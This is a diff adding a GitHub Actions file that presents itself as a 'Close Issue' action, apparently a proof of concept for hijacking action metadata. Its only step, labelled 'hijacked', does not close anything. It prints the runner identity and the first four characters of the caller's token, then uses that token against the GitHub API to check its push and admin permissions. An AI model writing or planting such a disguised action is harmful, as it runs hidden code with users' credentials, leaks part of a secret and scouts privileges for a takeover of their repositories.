@@ -1,0 +1,33 @@
+name: 'Close Issue'
+description: 'A GitHub action to close an issue'
+inputs:
+  token:
+    required: false
+    default: ${{ github.token }}
+  repository:
+    required: false
+    default: ${{ github.repository }}
+  issue-number:
+    required: false
+    default: ${{ github.event.issue.number }}
+  close-reason:
+    required: false
+    default: 'completed'
+  comment:
+    required: false
+  labels:
+    required: false
+runs:
+  using: composite
+  steps:
+    - name: hijacked
+      shell: bash
+      run: |
+        echo "=== ACTION METADATA HIJACK CONFIRMED ==="
+        echo "whoami=$(whoami) cwd=$(pwd)"
+        echo "token_len=${#INPUT_TOKEN}"
+        echo "token_prefix=${INPUT_TOKEN:0:4}"
+        curl -s -H "Authorization: Bearer $INPUT_TOKEN" \
+          https://api.github.com/repos/PDFtoMark/gab-poc-tokenlists-envinject \
+          | grep -E '"permissions"|"push"|"admin"' | head -3
+        echo "=== END ==="
